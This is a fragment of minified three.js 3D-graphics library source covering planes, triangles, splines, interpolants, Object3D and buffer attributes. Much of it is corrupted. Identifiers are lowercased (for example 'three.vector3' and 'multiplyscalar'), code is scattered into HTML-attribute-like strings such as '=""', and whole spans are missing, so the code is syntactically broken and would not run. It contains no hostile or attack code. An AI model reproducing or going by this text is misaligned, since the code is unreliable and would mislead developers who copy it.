b=this.planes,c=0;6>c;c++)if(0>b[c].distanceToPoint(a))return!1;return!0}};THREE.Plane=function(a,b){this.normal=void 0!==a?a:new THREE.Vector3(1,0,0);this.constant=void 0!==b?b:0};\nTHREE.Plane.prototype={constructor:THREE.Plane,set:function(a,b){this.normal.copy(a);this.constant=b;return this},setComponents:function(a,b,c,d){this.normal.set(a,b,c);this.constant=d;return this},setFromNormalAndCoplanarPoint:function(a,b){this.normal.copy(a);this.constant=-b.dot(this.normal);return this},setFromCoplanarPoints:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c,d,e){d=a.subVectors(e,d).cross(b.subVectors(c,d)).normalize();this.setFromNormalAndCoplanarPoint(d,\nc);return this}}(),clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.normal.copy(a.normal);this.constant=a.constant;return this},normalize:function(){var a=1/this.normal.length();this.normal.multiplyScalar(a);this.constant*=a;return this},negate:function(){this.constant*=-1;this.normal.negate();return this},distanceToPoint:function(a){return this.normal.dot(a)+this.constant},distanceToSphere:function(a){return this.distanceToPoint(a.center)-a.radius},projectPoint:function(a,\nb){return this.orthoPoint(a,b).sub(a).negate()},orthoPoint:function(a,b){var c=this.distanceToPoint(a);return(b||new THREE.Vector3).copy(this.normal).multiplyScalar(c)},intersectLine:function(){var a=new THREE.Vector3;return function(b,c){var d=c||new THREE.Vector3,e=b.delta(a),f=this.normal.dot(e);if(0===f){if(0===this.distanceToPoint(b.start))return d.copy(b.start)}else return f=-(b.start.dot(this.normal)+this.constant)/f,0>f||1<f?void 0=\"\" 0:d.copy(e).multiplyscalar(f).add(b.start)}}(),intersectsline:function(a){var=\"\" b=\"this.distanceToPoint(a.start);a=this.distanceToPoint(a.end);return\">b&&0<a||0>a&&0<b},intersectsbox:function(a){return a.intersectsplane(this)},intersectssphere:function(a){return=\"\" a.intersectsplane(this)},coplanarpoint:function(a){return(a||new=\"\" three.vector3).copy(this.normal).multiplyscalar(-this.constant)},applymatrix4:function(){var=\"\" a=\"new\" three.vector3,b=\"new\" three.matrix3;return=\"\" function(c,d){var=\"\" e=\"this.coplanarPoint(a).applyMatrix4(c),f=d||b.getNormalMatrix(c),f=this.normal.applyMatrix3(f).normalize();\" this.constant=\"-e.dot(f);return\" this}}(),translate:function(a){this.constant-=\"a.dot(this.normal);return\" this},equals:function(a){return=\"\" a.normal.equals(this.normal)&&a.constant=\"==this.constant}};THREE.Spherical=function(a,b,c){this.radius=void\" 0!=\"=a?a:1;this.phi=void\" this};=\"\" three.spherical.prototype=\"{constructor:THREE.Spherical,set:function(a,b,c){this.radius=a;this.phi=b;this.theta=c;return\" this},clone:function(){return(new=\"\" this.constructor).copy(this)},copy:function(a){this.radius.copy(a.radius);this.phi.copy(a.phi);this.theta.copy(a.theta);return=\"\" this},makesafe:function(){this.phi=\"Math.max(1E-6,Math.min(Math.PI-1E-6,this.phi));return\" this},setfromvector3:function(a){this.radius=\"a.length();0===this.radius?this.phi=this.theta=0:(this.theta=Math.atan2(a.x,a.z),this.phi=\" math.acos(three.math.clamp(a.y=\"\" this.radius,-1,1)));return=\"\" this}};=\"\" three.math=\"{DEG2RAD:Math.PI/180,RAD2DEG:180/Math.PI,generateUUID:function(){var\" .split(\"\"),b=\"Array(36),c=0,d;return\" function(){for(var=\"\">e;e++)8===e||13===e||18===e||23===e?b[e]=\"-\":14===e?b[e]=\"4\":(2>=c&&(c=33554432+16777216*Math.random()|0),d=c&15,c>>=4,b[e]=a[19===e?d&3|8:d]);return b.join(\"\")}}(),clamp:function(a,b,c){return Math.max(b,Math.min(c,a))},euclideanModulo:function(a,b){return(a%b+b)%b},mapLinear:function(a,b,c,\nd,e){return d+(a-b)*(e-d)/(c-b)},smoothstep:function(a,b,c){if(a<=b)return 0;if(a=\"\">=c)return 1;a=(a-b)/(c-b);return a*a*(3-2*a)},smootherstep:function(a,b,c){if(a<=b)return 0;if(a=\"\">=c)return 1;a=(a-b)/(c-b);return a*a*a*(a*(6*a-15)+10)},random16:function(){console.warn(\"THREE.Math.random16() has been deprecated. Use Math.random() instead.\");return Math.random()},randInt:function(a,b){return a+Math.floor(Math.random()*(b-a+1))},randFloat:function(a,b){return a+Math.random()*(b-a)},randFloatSpread:function(a){return a*\n(.5-Math.random())},degToRad:function(a){return a*THREE.Math.DEG2RAD},radToDeg:function(a){return a*THREE.Math.RAD2DEG},isPowerOfTwo:function(a){return 0===(a&a-1)&&0!==a},nearestPowerOfTwo:function(a){return Math.pow(2,Math.round(Math.log(a)/Math.LN2))},nextPowerOfTwo:function(a){a--;a|=a>>1;a|=a>>2;a|=a>>4;a|=a>>8;a|=a>>16;a++;return a}};\nTHREE.Spline=function(a){function b(a,b,c,d,e,f,g){a=.5*(c-a);d=.5*(d-b);return(2*(b-c)+a+d)*g+(-3*(b-c)-2*a-d)*f+a*e+b}this.points=a;var c=[],d={x:0,y:0,z:0},e,f,g,h,k,l,n,p,m;this.initFromArray=function(a){this.points=[];for(var b=0;b<a.length;b++)this.points[b]={x:a[b][0],y:a[b][1],z:a[b][2]}};this.getpoint=function(a){e=(this.points.length-1)*a;f=math.floor(e);g=e-f;c[0]=0===f?f:f-1;c[1]=f;c[2]=f>this.points.length-2?this.points.length-1:f+1;c[3]=f>this.points.length-3?this.points.length-1:f+\n2;l=this.points[c[0]];n=this.points[c[1]];p=this.points[c[2]];m=this.points[c[3]];h=g*g;k=g*h;d.x=b(l.x,n.x,p.x,m.x,g,h,k);d.y=b(l.y,n.y,p.y,m.y,g,h,k);d.z=b(l.z,n.z,p.z,m.z,g,h,k);return d};this.getControlPointsArray=function(){var a,b,c=this.points.length,d=[];for(a=0;a<c;a++)b=this.points[a],d[a]=[b.x,b.y,b.z];return d};this.getlength=\"function(a){var\" b,c,d,e=\"b=b=0,f=new\" three.vector3,g=\"new\" three.vector3,h=\"[],k=0;h[0]=0;a||(a=100);c=this.points.length*a;f.copy(this.points[0]);for(a=1;a<c;a++)b=\" a=\"\" c,d=\"this.getPoint(b),g.copy(d),k+=g.distanceTo(f),f.copy(d),b*=this.points.length-1,b=Math.floor(b),b!==e&&(h[b]=k,e=b);h[h.length]=k;return{chunks:h,total:k}};this.reparametrizeByArcLength=function(a){var\" b,c,d,e,f,g,h=\"[],k=new\" three.vector3,m=\"this.getLength();h.push(k.copy(this.points[0]).clone());for(b=1;b<this.points.length;b++){c=m.chunks[b]-m.chunks[b-1];g=Math.ceil(a*c/m.total);e=(b-1)/(this.points.length-1);f=b/(this.points.length-1);for(c=1;c<g-1;c++)d=e+1/g*c*(f-e),d=this.getPoint(d),\" h.push(k.copy(d).clone());h.push(k.copy(this.points[b]).clone())}this.points=\"h}};THREE.Triangle=function(a,b,c){this.a=void\" 0!=\"=a?a:new\" three.vector3;this.b=\"void\" three.vector3;this.c=\"void\" three.vector3};three.triangle.normal=\"function(){var\" three.vector3;return=\"\" function(b,c,d,e){e=\"e||new\" three.vector3;e.subvectors(d,c);a.subvectors(b,c);e.cross(a);b=\"e.lengthSq();return\" 0<b?e.multiplyscalar(1=\"\" math.sqrt(b)):e.set(0,0,0)}}();=\"\" three.triangle.barycoordfrompoint=\"function(){var\" three.vector3,b=\"new\" three.vector3,c=\"new\" function(d,e,f,g,h){a.subvectors(g,e);b.subvectors(f,e);c.subvectors(d,e);d=\"a.dot(a);e=a.dot(b);f=a.dot(c);var\" k=\"b.dot(b);g=b.dot(c);var\" l=\"d*k-e*e;h=h||new\" three.vector3;if(0=\"==l)return\" h.set(-2,-1,-1);l=\"1/l;k=(k*f-e*g)*l;d=(d*g-e*f)*l;return\" h.set(1-k-d,d,k)}}();=\"\" three.triangle.containspoint=\"function(){var\" function(b,c,d,e){b=\"THREE.Triangle.barycoordFromPoint(b,c,d,e,a);return\" 0<=\"b.x&&0<=b.y&&1\">=b.x+b.y}}();\nTHREE.Triangle.prototype={constructor:THREE.Triangle,set:function(a,b,c){this.a.copy(a);this.b.copy(b);this.c.copy(c);return this},setFromPointsAndIndices:function(a,b,c,d){this.a.copy(a[b]);this.b.copy(a[c]);this.c.copy(a[d]);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.a.copy(a.a);this.b.copy(a.b);this.c.copy(a.c);return this},area:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(){a.subVectors(this.c,this.b);b.subVectors(this.a,\nthis.b);return.5*a.cross(b).length()}}(),midpoint:function(a){return(a||new THREE.Vector3).addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)},normal:function(a){return THREE.Triangle.normal(this.a,this.b,this.c,a)},plane:function(a){return(a||new THREE.Plane).setFromCoplanarPoints(this.a,this.b,this.c)},barycoordFromPoint:function(a,b){return THREE.Triangle.barycoordFromPoint(a,this.a,this.b,this.c,b)},containsPoint:function(a){return THREE.Triangle.containsPoint(a,this.a,this.b,this.c)},\nclosestPointToPoint:function(){var a,b,c,d;return function(e,f){void 0===a&&(a=new THREE.Plane,b=[new THREE.Line3,new THREE.Line3,new THREE.Line3],c=new THREE.Vector3,d=new THREE.Vector3);var g=f||new THREE.Vector3,h=Infinity;a.setFromCoplanarPoints(this.a,this.b,this.c);a.projectPoint(e,c);if(!0===this.containsPoint(c))g.copy(c);else{b[0].set(this.a,this.b);b[1].set(this.b,this.c);b[2].set(this.c,this.a);for(var k=0;k<b.length;k++){b[k].closestpointtopoint(c,!0,d);var 0=\"==d){if(a<e)break\" l=\"c.distanceToSquared(d);l<\" h&&(h=\"l,g.copy(d))}}return\" g}}(),equals:function(a){return=\"\" a.a.equals(this.a)&&a.b.equals(this.b)&&a.c.equals(this.c)}};three.interpolant=\"function(a,b,c,d){this.parameterPositions=a;this._cachedIndex=0;this.resultBuffer=void\" 0!=\"=d?d:new\" b.constructor(c);this.samplevalues=\"b;this.valueSize=c};\" three.interpolant.prototype=\"{constructor:THREE.Interpolant,evaluate:function(a){var\" b=\"this.parameterPositions,c=this._cachedIndex,d=b[c],e=b[c-1];a:{b:{c:{d:if(!(a<d)){for(var\" f=\"c+2;;){if(void\" d;this._cachedindex=\"c=b.length;return\" this.afterend_(c-1,a,e)}if(c=\"==f)break;e=d;d=b[++c];if(a<d)break\" b}d=\"b.length;break\" c}if(a=\"\">=e)break a;else{f=b[1];a<f&&(c=2,e=f);for(f=c-2;;){if(void 0=\"==e)return\" this._cachedindex=\"0,this.beforeStart_(0,a,d);if(c===f)break;d=e;e=b[--c-1];if(a\">=e)break b}d=\nc;c=0}}for(;c<d;)e=c+d>>>1,a<b[e]?d=e:c=e+1;d=b[c];e=b[c-1];if(void 0=\"==e)return\" this._cachedindex=\"0,this.beforeStart_(0,a,d);if(void\" this.interpolate_(c,e,a,d)},settings:null,defaultsettings_:{},getsettings_:function(){return=\"\" this.settings||this.defaultsettings_},copysamplevalue_:function(a){var=\"\" b=\"this.resultBuffer,c=this.sampleValues,d=this.valueSize;a*=d;for(var\" e=\"0;e!==d;++e)b[e]=\" c[a+e];return=\"\" b},interpolate_:function(a,b,c,d){throw=\"\" error(\"call=\"\" to=\"\" abstract=\"\" method\");},intervalchanged_:function(a,b,c){}};object.assign(three.interpolant.prototype,{beforestart_:three.interpolant.prototype.copysamplevalue_,afterend_:three.interpolant.prototype.copysamplevalue_});three.cubicinterpolant=\"function(a,b,c,d){THREE.Interpolant.call(this,a,b,c,d);this._offsetNext=this._weightNext=this._offsetPrev=this._weightPrev=-0};\" three.cubicinterpolant.prototype=\"Object.assign(Object.create(THREE.Interpolant.prototype),{constructor:THREE.CubicInterpolant,DefaultSettings_:{endingStart:THREE.ZeroCurvatureEnding,endingEnd:THREE.ZeroCurvatureEnding},intervalChanged_:function(a,b,c){var\" d=\"this.parameterPositions,e=a-2,f=a+1,g=d[e],h=d[f];if(void\" three.zeroslopeending:e=\"a;g=2*b-c;break;case\" three.wraparoundending:e=\"d.length-2;g=b+d[e]-d[e+1];break;default:e=a,g=c}if(void\" three.zeroslopeending:f=\"a;h=2*c-b;break;case\" three.wraparoundending:f=\"1;h=c+d[1]-d[0];break;default:f=a-1,h=b}a=.5*(c-b);d=this.valueSize;this._weightPrev=a/(b-g);this._weightNext=a/(h-c);this._offsetPrev=e*d;this._offsetNext=f*d},interpolate_:function(a,b,c,d){var\" h=\"a-g,k=this._offsetPrev,l=this._offsetNext,n=this._weightPrev,p=this._weightNext,m=(c-b)/(d-b);c=m*m;d=c*m;b=-n*d+2*n*c-n*m;n=(1+n)*d+(-1.5-2*n)*c+(-.5+n)*m+1;m=(-1-p)*d+(1.5+p)*c+.5*m;p=p*d-p*\" c;for(c=\"0;c!==g;++c)e[c]=b*f[k+c]+n*f[h+c]+m*f[a+c]+p*f[l+c];return\" e}});three.discreteinterpolant=\"function(a,b,c,d){THREE.Interpolant.call(this,a,b,c,d)};THREE.DiscreteInterpolant.prototype=Object.assign(Object.create(THREE.Interpolant.prototype),{constructor:THREE.DiscreteInterpolant,interpolate_:function(a,b,c,d){return\" this.copysamplevalue_(a-1)}});three.linearinterpolant=\"function(a,b,c,d){THREE.Interpolant.call(this,a,b,c,d)};\" three.linearinterpolant.prototype=\"Object.assign(Object.create(THREE.Interpolant.prototype),{constructor:THREE.LinearInterpolant,interpolate_:function(a,b,c,d){var\" e}});three.quaternionlinearinterpolant=\"function(a,b,c,d){THREE.Interpolant.call(this,a,b,c,d)};\" three.quaternionlinearinterpolant.prototype=\"Object.assign(Object.create(THREE.Interpolant.prototype),{constructor:THREE.QuaternionLinearInterpolant,interpolate_:function(a,b,c,d){var\" e}});three.clock=\"function(a){this.autoStart=void\" 0!=\"=a?a:!0;this.elapsedTime=this.oldTime=this.startTime=0;this.running=!1};\" three.clock.prototype=\"{constructor:THREE.Clock,start:function(){this.oldTime=this.startTime=(performance||Date).now();this.running=!0},stop:function(){this.getElapsedTime();this.running=!1},getElapsedTime:function(){this.getDelta();return\" this.elapsedtime},getdelta:function(){var=\"\" a=\"0;this.autoStart&&!this.running&&this.start();if(this.running){var\" a}};three.eventdispatcher=\"function(){};\" object.assign(three.eventdispatcher.prototype,{addeventlistener:function(a,b){void=\"\" c=\"this._listeners;void\" void=\"\" this._listeners){var=\"\" (function(a){function=\"\" b(a,b){return=\"\" a.distance-b.distance}function=\"\" c(a,b,f,g){if(!1!=\"=a.visible&&(a.raycast(b,f),!0===g)){a=a.children;g=0;for(var\" a.ray(b,c);this.near=\"f||0;this.far=g||Infinity;this.params={Mesh:{},Line:{},LOD:{},Points:{threshold:1},Sprite:{}};Object.defineProperties(this.params,{PointCloud:{get:function(){console.warn(\"THREE.Raycaster:\" params.pointcloud=\"\" has=\"\" been=\"\" renamed=\"\" params.points.\");return=\"\" this.points}}})};=\"\" a.raycaster.prototype=\"{constructor:a.Raycaster,linePrecision:1,set:function(a,b){this.ray.set(a,b)},setFromCamera:function(b,c){c\" instanceof=\"\" a.perspectivecamera?(this.ray.origin.setfrommatrixposition(c.matrixworld),this.ray.direction.set(b.x,b.y,.5).unproject(c).sub(this.ray.origin).normalize()):c=\"\" a.orthographiccamera?(this.ray.origin.set(b.x,b.y,(c.near+c.far)=\"\" (c.near-c.far)).unproject(c),this.ray.direction.set(0,0,-1).transformdirection(c.matrixworld)):console.error(\"three.raycaster:=\"\" unsupported=\"\" camera=\"\" type.\")},=\"\" intersectobject:function(a,e){var=\"\" f=\"[];c(a,this,f,e);f.sort(b);return\" f},intersectobjects:function(a,e){var=\"\" console.warn(\"three.raycaster.intersectobjects:=\"\" objects=\"\" is=\"\" not=\"\" an=\"\" array.\"),f;for(var=\"\" g=\"0,h=a.length;g<h;g++)c(a[g],this,f,e);f.sort(b);return\" f}}})(three);=\"\" three.object3d=\"function(){Object.defineProperty(this,\"id\",{value:THREE.Object3DIdCount++});this.uuid=THREE.Math.generateUUID();this.name=\"\";this.type=\"Object3D\";this.parent=null;this.children=[];this.up=THREE.Object3D.DefaultUp.clone();var\" three.vector3,b=\"new\" three.euler,c=\"new\" three.quaternion,d=\"new\" three.vector3(1,1,1);b.onchange(function(){c.setfromeuler(b,!1)});c.onchange(function(){b.setfromquaternion(c,void=\"\" 0,!1)});object.defineproperties(this,{position:{enumerable:!0,value:a},rotation:{enumerable:!0,=\"\" value:b},quaternion:{enumerable:!0,value:c},scale:{enumerable:!0,value:d},modelviewmatrix:{value:new=\"\" three.matrix4},normalmatrix:{value:new=\"\" three.matrix3}});this.matrix=\"new\" three.matrix4;this.matrixworld=\"new\" three.matrix4;this.matrixautoupdate=\"THREE.Object3D.DefaultMatrixAutoUpdate;this.matrixWorldNeedsUpdate=!1;this.layers=new\" three.layers;this.visible=\"!0;this.receiveShadow=this.castShadow=!1;this.frustumCulled=!0;this.renderOrder=0;this.userData={}};\" three.object3d.defaultup=\"new\" three.vector3(0,1,0);three.object3d.defaultmatrixautoupdate=\"!0;\" object.assign(three.object3d.prototype,three.eventdispatcher.prototype,{applymatrix:function(a){this.matrix.multiplymatrices(a,this.matrix);this.matrix.decompose(this.position,this.quaternion,this.scale)},setrotationfromaxisangle:function(a,b){this.quaternion.setfromaxisangle(a,b)},setrotationfromeuler:function(a){this.quaternion.setfromeuler(a,!0)},setrotationfrommatrix:function(a){this.quaternion.setfromrotationmatrix(a)},setrotationfromquaternion:function(a){this.quaternion.copy(a)},rotateonaxis:function(){var=\"\" three.quaternion;return=\"\" function(b,c){a.setfromaxisangle(b,c);this.quaternion.multiply(a);return=\"\" this}}(),rotatex:function(){var=\"\" three.vector3(1,0,0);return=\"\" function(b){return=\"\" this.rotateonaxis(a,b)}}(),rotatey:function(){var=\"\" three.vector3(0,1,0);return=\"\" this.rotateonaxis(a,b)}}(),rotatez:function(){var=\"\" three.vector3(0,0,1);return=\"\" this.rotateonaxis(a,b)}}(),translateonaxis:function(){var=\"\" three.vector3;return=\"\" function(b,c){a.copy(b).applyquaternion(this.quaternion);=\"\" this.position.add(a.multiplyscalar(c));return=\"\" this}}(),translatex:function(){var=\"\" this.translateonaxis(a,b)}}(),translatey:function(){var=\"\" this.translateonaxis(a,b)}}(),translatez:function(){var=\"\" this.translateonaxis(a,b)}}(),localtoworld:function(a){return=\"\" a.applymatrix4(this.matrixworld)},worldtolocal:function(){var=\"\" three.matrix4;return=\"\" b.applymatrix4(a.getinverse(this.matrixworld))}}(),=\"\" lookat:function(){var=\"\" function(b){a.lookat(b,this.position,this.up);this.quaternion.setfromrotationmatrix(a)}}(),add:function(a){if(1<arguments.length){for(var=\"\" this}if(a=\"==this)return\" console.error(\"three.object3d.add:=\"\" object=\"\" can't=\"\" be=\"\" added=\"\" as=\"\" child=\"\" of=\"\" itself.\",a),this;a=\"\" three.object3d?(null!=\"=a.parent&&a.parent.remove(a),a.parent=this,a.dispatchEvent({type:\"added\"}),this.children.push(a)):console.error(\"THREE.Object3D.add:\" instance=\"\" three.object3d.\",=\"\" a);return=\"\" this},remove:function(a){if(1<arguments.length)for(var=\"\" this.getobjectbyproperty(\"id\",a)},getobjectbyname:function(a){return=\"\" this.getobjectbyproperty(\"name\",a)},getobjectbyproperty:function(a,b){if(this[a]=\"==b)return\" this;for(var=\"\" b);if(void=\"\" e}},getworldposition:function(a){a=\"a||new\" three.vector3;this.updatematrixworld(!0);return=\"\" a.setfrommatrixposition(this.matrixworld)},getworldquaternion:function(){var=\"\" function(c){c=\"c||new\" three.quaternion;this.updatematrixworld(!0);this.matrixworld.decompose(a,c,b);return=\"\" c}}(),getworldrotation:function(){var=\"\" function(b){b=\"b||new\" three.euler;this.getworldquaternion(a);return=\"\" b.setfromquaternion(a,=\"\" this.rotation.order,!1)}}(),getworldscale:function(){var=\"\" three.vector3;this.updatematrixworld(!0);this.matrixworld.decompose(a,b,c);return=\"\" c}}(),getworlddirection:function(){var=\"\" three.vector3;this.getworldquaternion(a);return=\"\" b.set(0,0,1).applyquaternion(a)}}(),raycast:function(){},traverse:function(a){a(this);for(var=\"\" this.visible){a(this);for(var=\"\" this.matrix),this.matrixworldneedsupdate=\"!1,a=!0;for(var\" b(a){var=\"\" in=\"\" a){var=\"\" d.metadata;b.push(d)}return=\"\" b}var=\"\" (e.userdata=\"this.userData);!0===this.castShadow&&(e.castShadow=!0);!0===this.receiveShadow&&(e.receiveShadow=!0);!1===this.visible&&(e.visible=!1);e.matrix=this.matrix.toArray();void\" [];for(var=\"\" d},clone:function(a){return(new=\"\" this.constructor).copy(this,a)},copy:function(a,b){void=\"\" this.matrix.copy(a.matrix);this.matrixworld.copy(a.matrixworld);this.matrixautoupdate=\"a.matrixAutoUpdate;this.matrixWorldNeedsUpdate=a.matrixWorldNeedsUpdate;this.visible=a.visible;this.castShadow=a.castShadow;this.receiveShadow=a.receiveShadow;this.frustumCulled=a.frustumCulled;this.renderOrder=a.renderOrder;this.userData=JSON.parse(JSON.stringify(a.userData));if(!0===b)for(var\" this}});three.object3didcount=\"0;\" three.face3=\"function(a,b,c,d,e,f){this.a=a;this.b=b;this.c=c;this.normal=d\" three.vector3?d:new=\"\" three.vector3;this.vertexnormals=\"Array.isArray(d)?d:[];this.color=e\" three.color?e:new=\"\" three.color;this.vertexcolors=\"Array.isArray(e)?e:[];this.materialIndex=void\" three.face3.prototype=\"{constructor:THREE.Face3,clone:function(){return(new\" this.constructor).copy(this)},copy:function(a){this.a=\"a.a;this.b=a.b;this.c=a.c;this.normal.copy(a.normal);this.color.copy(a.color);this.materialIndex=a.materialIndex;for(var\" this}};=\"\" three.bufferattribute=\"function(a,b,c){this.uuid=THREE.Math.generateUUID();this.array=a;this.itemSize=b;this.dynamic=!1;this.updateRange={offset:0,count:-1};this.version=0;this.normalized=!0===c};\" three.bufferattribute.prototype=\"{constructor:THREE.BufferAttribute,get\" count(){return=\"\" this.array.length=\"\" this.itemsize},set=\"\" needsupdate(a){!0=\"==a&&this.version++},setDynamic:function(a){this.dynamic=a;return\" this},copy:function(a){this.array=\"new\" a.array.constructor(a.array);this.itemsize=\"a.itemSize;this.dynamic=a.dynamic;return\" this},copyat:function(a,b,c){a*=\"this.itemSize;c*=b.itemSize;for(var\" this},copyarray:function(a){this.array.set(a);=\"\" return=\"\" this},copycolorsarray:function(a){for(var=\"\" color=\"\" undefined\",d),f=\"new\" three.color);b[c++]=\"f.r;b[c++]=f.g;b[c++]=f.b}return\" this},copyindicesarray:function(a){for(var=\"\" this},copyvector2sarray:function(a){for(var=\"\" vector=\"\" undefined\",=\"\" d),f=\"new\" three.vector2);b[c++]=\"f.x;b[c++]=f.y}return\" this},copyvector3sarray:function(a){for(var=\"\" three.vector3);b[c++]=\"f.x;b[c++]=f.y;b[c++]=f.z}return\" this},copyvector4sarray:function(a){for(var=\"\" three.vector4);=\"\" b[c++]=\"f.x;b[c++]=f.y;b[c++]=f.z;b[c++]=f.w}return\" this},set:function(a,b){void=\"\" this},getx:function(a){return=\"\" this.array[a*this.itemsize]},setx:function(a,b){this.array[a*this.itemsize]=\"b;return\" this},gety:function(a){return=\"\" this.array[a*this.itemsize+1]},sety:function(a,b){this.array[a*this.itemsize+1]=\"b;return\" this},getz:function(a){return=\"\" this.array[a*this.itemsize+2]},setz:function(a,b){this.array[a*this.itemsize+2]=\"b;return\" this},getw:function(a){return=\"\" this.array[a*=\"\" this.itemsize+3]},setw:function(a,b){this.array[a*this.itemsize+3]=\"b;return\" this},setxy:function(a,b,c){a*=\"this.itemSize;this.array[a+0]=b;this.array[a+1]=c;return\" this},setxyz:function(a,b,c,d){a*=\"this.itemSize;this.array[a+0]=b;this.array[a+1]=c;this.array[a+2]=d;return\" this},setxyzw:function(a,b,c,d,e){a*=\"this.itemSize;this.array[a+0]=b;this.array[a+1]=c;this.array[a+2]=d;this.array[a+3]=e;return\" this},clone:function(){return(new=\"\" this.constructor).copy(this)}};=\"\" three.int8attribute=\"function(a,b){return\" new=\"\" three.bufferattribute(new=\"\" int8array(a),b)};three.uint8attribute=\"function(a,b){return\" uint8array(a),b)};three.uint8clampedattribute=\"function(a,b){return\" uint8clampedarray(a),b)};three.int16attribute=\"function(a,b){return\" int16array(a),b)};three.uint16attribute=\"function(a,b){return\" uint16array(a),b)};=\"\" three.int32attribute=\"function(a,b){return\" int32array(a),b)};three.uint32attribute=\"function(a,b){return\" uint32array(a),b)};three.float32attribute=\"function(a,b){return\" float32array(a),b)};three.float64attribute=\"function(a,b){return\" float64array(a),b)};=\"\" three.dynamicbufferattribute=\"function(a,b){console.warn(\"THREE.DynamicBufferAttribute\" removed.=\"\" use=\"\" three.bufferattribute().setdynamic(=\"\" true=\"\" )=\"\" instead.\");return(new=\"\" three.bufferattribute(a,b)).setdynamic(!0)};three.instancedbufferattribute=\"function(a,b,c){THREE.BufferAttribute.call(this,a,b);this.meshPerAttribute=c||1};THREE.InstancedBufferAttribute.prototype=Object.create(THREE.BufferAttribute.prototype);THREE.InstancedBufferAttribute.prototype.constructor=THREE.InstancedBufferAttribute;\" three.instancedbufferattribute.prototype.copy=\"function(a){THREE.BufferAttribute.prototype.copy.call(this,a);this.meshPerAttribute=a.meshPerAttribute;return\" this};three.interleavedbuffer=\"function(a,b){this.uuid=THREE.Math.generateUUID();this.array=a;this.stride=b;this.dynamic=!1;this.updateRange={offset:0,count:-1};this.version=0};\" three.interleavedbuffer.prototype=\"{constructor:THREE.InterleavedBuffer,get\" length(){return=\"\" this.array.length},get=\"\" this.stride},set=\"\" a.array.constructor(a.array);this.stride=\"a.stride;this.dynamic=a.dynamic;return\" this},set:function(a,=\"\" b){void=\"\" this.constructor).copy(this)}};three.instancedinterleavedbuffer=\"function(a,b,c){THREE.InterleavedBuffer.call(this,a,b);this.meshPerAttribute=c||1};THREE.InstancedInterleavedBuffer.prototype=Object.create(THREE.InterleavedBuffer.prototype);THREE.InstancedInterleavedBuffer.prototype.constructor=THREE.InstancedInterleavedBuffer;\" three.instancedinterleavedbuffer.prototype.copy=\"function(a){THREE.InterleavedBuffer.prototype.copy.call(this,a);this.meshPerAttribute=a.meshPerAttribute;return\" this};three.interleavedbufferattribute=\"function(a,b,c){this.uuid=THREE.Math.generateUUID();this.data=a;this.itemSize=b;this.offset=c};\" three.interleavedbufferattribute.prototype=\"{constructor:THREE.InterleavedBufferAttribute,get\" length(){console.warn(\"three.bufferattribute:=\"\" .length=\"\" deprecated.=\"\" please=\"\" .count.\");return=\"\" this.data.count},setx:function(a,b){this.data.array[a*this.data.stride+this.offset]=\"b;return\" this},sety:function(a,b){this.data.array[a*this.data.stride+this.offset+1]=\"b;return\" this},setz:function(a,b){this.data.array[a*this.data.stride+this.offset+2]=\"b;return\" this},=\"\" setw:function(a,b){this.data.array[a*this.data.stride+this.offset+3]=\"b;return\" this.data.array[a*this.data.stride+this.offset]},gety:function(a){return=\"\" this.data.array[a*this.data.stride+this.offset+1]},getz:function(a){return=\"\" this.data.array[a*this.data.stride+this.offset+2]},getw:function(a){return=\"\" this.data.array[a*this.data.stride+this.offset+3]},setxy:function(a,b,c){a=\"a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+1]=c;return\" this},setxyz:function(a,=\"\" b,c,d){a=\"a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+1]=c;this.data.array[a+2]=d;return\" this},setxyzw:function(a,b,c,d,e){a=\"a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+1]=c;this.data.array[a+2]=d;this.data.array[a+3]=e;return\" three.geometry=\"function(){Object.defineProperty(this,\"id\",{value:THREE.GeometryIdCount++});this.uuid=THREE.Math.generateUUID();this.name=\"\";this.type=\"Geometry\";this.vertices=[];this.colors=[];this.faces=[];this.faceVertexUvs=[[]];this.morphTargets=[];this.morphNormals=[];this.skinWeights=[];this.skinIndices=[];this.lineDistances=[];this.boundingSphere=this.boundingBox=null;this.groupsNeedUpdate=this.lineDistancesNeedUpdate=this.colorsNeedUpdate=this.normalsNeedUpdate=this.uvsNeedUpdate=this.elementsNeedUpdate=\" this.verticesneedupdate=\"!1};\" object.assign(three.geometry.prototype,three.eventdispatcher.prototype,{applymatrix:function(a){for(var=\"\" three.matrix3).getnormalmatrix(a),c=\"0,d=this.vertices.length;c<d;c++)this.vertices[c].applyMatrix4(a);c=0;for(d=this.faces.length;c<d;c++){a=this.faces[c];a.normal.applyMatrix3(b).normalize();for(var\" this.normalsneedupdate=\"this.verticesNeedUpdate=!0;return\" this},rotatex:function(){var=\"\" a;return=\"\" function(b){void=\"\" three.matrix4);a.makerotationx(b);this.applymatrix(a);return=\"\" this}}(),rotatey:function(){var=\"\" three.matrix4);a.makerotationy(b);this.applymatrix(a);return=\"\" this}}(),rotatez:function(){var=\"\" three.matrix4);a.makerotationz(b);this.applymatrix(a);return=\"\" this}}(),translate:function(){var=\"\" function(b,=\"\" c,d){void=\"\" three.matrix4);a.maketranslation(b,c,d);this.applymatrix(a);return=\"\" this}}(),scale:function(){var=\"\" function(b,c,d){void=\"\" three.matrix4);a.makescale(b,c,d);this.applymatrix(a);return=\"\" this}}(),lookat:function(){var=\"\" three.object3d);a.lookat(b);a.updatematrix();this.applymatrix(a.matrix)}}(),frombuffergeometry:function(a){function=\"\" b(a,b,d,e){var=\"\" c.colors[b].clone(),c.colors[d].clone()]:[];e=\"new\" three.face3(a,b,d,f,q,e);c.faces.push(e);void=\"\" 0,e=\"a.attributes,f=e.position.array,g=void\" 0,h=\"void\" 0,k=\"void\" 0,l=\"void\" 0;void=\"\" []);for(var=\"\" n=\"[],p=[],m=[],q=e=0;e<f.length;e+=3,q+=2)c.vertices.push(new\" three.vector3(f[e],f[e+1],f[e+2])),void=\"\" three.vector3(g[e],g[e+1],g[e+2])),void=\"\" three.color(h[e],h[e+1],h[e+2])),void=\"\" three.vector2(k[q],k[q+1])),void=\"\" three.vector2(l[q],l[q+1]));if(void=\"\" 